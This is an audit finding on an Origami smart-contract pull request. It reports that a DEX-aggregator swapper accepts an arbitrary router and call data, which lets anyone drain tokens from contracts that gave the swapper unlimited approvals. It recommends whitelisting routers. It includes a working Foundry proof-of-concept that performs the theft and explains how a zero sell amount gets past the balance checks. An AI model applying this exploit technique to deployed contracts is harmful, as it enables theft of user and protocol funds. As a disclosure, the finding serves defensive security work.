# [MEDIUM] - Lack of input validation on `OrigamiDexAggregatorSwapper.execute()` allows an attacker to steal the token balance of contracts that granted approvals to the swapper contract

## Context

A review of [this Pull-Request](https://github.com/TempleDAO/origami/pull/940/) was requested, with the following two contracts in scope:

- `apps/protocol/contracts/common/swappers/OrigamiDexAggregatorSwapper.sol`
- `apps/protocol/contracts/common/swappers/OrigamiErc4626AndDexAggregatorSwapper.sol`

Both contracts suffer from the same issue (lack of input validation on the `router` address) so here I'll describe the issue on the `OrigamiDexAggregatorSwapper` only.

The changes aimed at giving more flexibility on which router to use when swapping tokens. 
Until now, the swapper had the router as an immutable address, but now, the router can be passed by the caller as an input argument, allowing the bot to optimize for the best swap available. 

## Issue Description

- The function `OrigamiDexAggregatorSwapper.execute()` has no access control so that any arbitrary address can call it
- That function accepts a `swapData` bytes parameter, which is decoded into a `router` and `data`, which are the target contract and the bytes for the call
- There is no input validation on the `router` or the data, so arbitrary values can be passed there.


```javascript
contract OrigamiDexAggregatorSwapper is IOrigamiSwapper, OrigamiElevatedAccess {
    using SafeERC20 for IERC20;
    using DexAggregator for address;

    struct RouteData {
        address router;
        bytes data;
    }

    constructor(
        address _initialOwner
    ) OrigamiElevatedAccess(_initialOwner) {
    }

    // ...

    /**
     * @notice Execute a DEX aggregator swap
     */
    function execute(
        IERC20 sellToken, 
        uint256 sellTokenAmount, 
        IERC20 buyToken, 
        bytes calldata swapData
    ) external override returns (uint256 buyTokenAmount) {
        sellToken.safeTransferFrom(msg.sender, address(this), sellTokenAmount);

        RouteData memory routeData = abi.decode(
            swapData, (RouteData)
        );

        buyTokenAmount = routeData.router.swap(sellToken, sellTokenAmount, buyToken, routeData.data);

        // Transfer back to the caller
        buyToken.safeTransfer(msg.sender, buyTokenAmount);
        emit Swap(address(sellToken), sellTokenAmount, address(buyToken), buyTokenAmount);
    }
}
```

The issue is that an arbitrary caller can pass any contract as a target and any data to be executed on that target. For instance, the `transferFrom()` function could be executed on a token contract to take tokens from contracts that granted approvals to the swapper. The following contracts grant infinite permissions to the swapper contract:

- OrigamiMorphoBorrowAndLend  -->  max approvals for `supplyToken` and `borrowToken`
- OrigamiLovTokenErc4626Manager   -->  max approvals for `depositAsset` and `debtAsset`
- OrigamiLovTokenFlashAndBorrowManager  -->  max approvals for `reserveToken` and `debtToken`

From the above, only the `OrigamiMorphoBorrowAndLend` holds any funds that could be stolen with this attack, because this contract is expected to have a surplus of `borrowToken` and `supplyToken`. 
At the moment of writing, the surplus is worth $1000, but after stolen they would eventually be more tokens to steal, after the next rebalance operation. 
The remaining contracts with infinite approvals to the swapper do not hold any approved funds at the moment. 

There are some checks and requirements performed in  the `router.swap()` function, but it is not hard to bypass them. The PoC provided in a later section describes the exact steps to perform such an attack. 

## Impact: medium

Even though the issue could be classified as a high-risk issue, the amount of funds vulnerable to this attack is limited to the `OrigamiMorphoBorrowAndLend`, and the amount is only the surplus tokens between rebalance operations. Therefore, the issue is downgraded to **medium**. 

## Recommended mitigation

The following mitigations were discussed with the team:
1. Client contracts approve as needed for the exact amount only. That will be a cumbersome migration to upgrade all
2. Add access control on the `execute()` function
3. Whitelist valid router contracts on the swapper 

From the above, I believe option 3/ is the safest. Adding access control on the `execute()` function means that any address with the `ElevatedAccess` role could still perform the attack. Moreover, a bit would need access to this function, as the rebalancing is done by a bot. A bot's private keys are more prone to leakages than a multisig. Whitelisting routers on the other hand can be forced to go through a multisig, reducing the likelihood of this attack. 

## Proof of Code

The following proof of code written in Foundry illustrates how an attacker could steal `borrowTokens` held by the `OrigamiMorphoBorrowAndLend` contract:

```javascript
pragma solidity 0.8.19;
// SPDX-License-Identifier: AGPL-3.0-or-later

import { Test, console } from "lib/forge-std/src/Test.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import { OrigamiDexAggregatorSwapper } from "contracts/common/swappers/OrigamiDexAggregatorSwapper.sol";
import { OrigamiMorphoBorrowAndLend } from "contracts/common/borrowAndLend/OrigamiMorphoBorrowAndLend.sol";

contract MockMorpho {
    // just a functions needed for initialization of MorphoBorrowLend
    function extSloads(bytes32[] memory slots) external view returns (bytes32[] memory) {
        bytes32[] memory array = new bytes32[](1);
        // just set some random bytes so that the initializator doesn't complain about it being 0
        array[0] = bytes32("asdfaasdfasdfasdfasdfasdfassd");
        return array;
    }
}

contract DexSwapperExploitTest is Test {
    OrigamiDexAggregatorSwapper public dexSwapper;
    OrigamiMorphoBorrowAndLend public morphoBorrowAndLend;

    address exploiter = makeAddr("exploiter");
    address origamiMultisig = makeAddr("origamiMultisig");

    // irrelevant for this test
    MockMorpho morpho = new MockMorpho();
    address _morphoMarketOracle = makeAddr("_morphoMarketOracle");
    address _morphoMarketIrm = makeAddr("_morphoMarketIrm");

    ERC20 supplyToken;
    ERC20 borrowToken;

    function setUp() public {
        supplyToken = new ERC20("SUPPLY", "SUPPLY");
        borrowToken = new ERC20("BORROW", "BORROW");

        dexSwapper = new OrigamiDexAggregatorSwapper(origamiMultisig);
        morphoBorrowAndLend = new OrigamiMorphoBorrowAndLend(
            origamiMultisig, // address _initialOwner,
            address(supplyToken), // address __supplyToken,
            address(borrowToken), // address __borrowToken,
            address(morpho), // address _morphoAddress,
            _morphoMarketOracle, // address _morphoMarketOracle,
            _morphoMarketIrm, // address _morphoMarketIrm,
            2000, // uint96 _morphoMarketLltv,
            1000 // uint256 _maxSafeLtv
        );

        vm.prank(origamiMultisig);
        morphoBorrowAndLend.setSwapper(address(dexSwapper));
    }

    function test_approvals() public {
        assertEq(supplyToken.allowance(address(morphoBorrowAndLend), address(dexSwapper)), type(uint256).max);
        assertEq(borrowToken.allowance(address(morphoBorrowAndLend), address(dexSwapper)), type(uint256).max);
    }

    function test_exploti_viaDexFlexySwapper() public {
        // OrigamiMorphoBorrowAndLend approves the swapper in the constructor
        assertEq(borrowToken.allowance(address(morphoBorrowAndLend), address(dexSwapper)), type(uint256).max);

        // the pre-condition is that there are some supply/borrow tokens in the OrigamiMorphoBorrowAndLend 
        // This may be from surplus debtTokens or other reasons
        deal(address(borrowToken), address(morphoBorrowAndLend), 0.1e18);

        //////////////// the exploit ////////////////
        // this exploit consists in stealing any borrowToken (or supplyToken) from 
        // any contract that has infinite approvals on the swapper contract:
        //  - OrigamiMorphoBorrowAndLend
        //  - OrigamiLovTokenErc4626Manager
        //  - OrigamiLovTokenFlashAndBorrowManager


        // `router` here is the target contract to call
        // `data` is the data to call on the target contract
        OrigamiDexAggregatorSwapper.RouteData memory routeData = OrigamiDexAggregatorSwapper.RouteData({
            router: address(borrowToken),
            data: abi.encodeWithSignature(
                "transferFrom(address,address,uint256)", 
                address(morphoBorrowAndLend), // from = morpho, who has max approvals to the swapper
                address(dexSwapper), // to == the swapper contract, which will send it after to the msg.sender
                0.1e18  // the balance to steal sitting on the morphoBorrowAndLend contract
            )
        });
        // we encode the transferFrom data as if it was the swap data
        bytes memory swapData = abi.encode(routeData);
        
        // note that this call can be done by anyone, as the dexSwapper.execute() has no access control
        vm.startPrank(exploiter);

        // The actual swap is done with DexAggregator.swap() (library called with the context of the swapper contract)
        // There are a number of checks that happen in the DexAggregator.swap() function, but they are bypassed in this attack:
        // 1. The router must be a non-empty contract
        // 2. After the sawp, this must hold: sellToken.balanceOf(swapper) = initialSellTokenBalance - sellTokenAmount. 
        //      however, the sender has control over the sellTokenAmount, 
        //      If we pass sellTokenAmount==0, the requirement turns into sellToken.balanceOf(swapper) == initialSellTokenBalance 
        //      which will be the case if we only call the transferFrom function on the buyToken.
        // 3. The buyToken balance of the swapper must increase (this is the case of the transferFrom, as we are sending the stolen tokens to the swapper contract, to let the swapper send it afterwards to the exploiter)
        dexSwapper.execute(
            supplyToken, // sellToken. // any token which balance doesn't change in the exploit
            0, // sellTokenAmount. // Setting this to 0 bypasses the check initialSellTokenBalance check
            borrowToken, // buyToken. // The swapper's balance of this token must increase
            swapData // swapData // the malicious data to call the transferFrom
        );

        // after the attack, the exploiter has stoken the borrowTokens from the OrigamiMorphoBorrowAndLend contract
        assertEq(borrowToken.balanceOf(exploiter), 0.1e18);
        assertEq(borrowToken.balanceOf(address(morphoBorrowAndLend)), 0);
    }
}
```
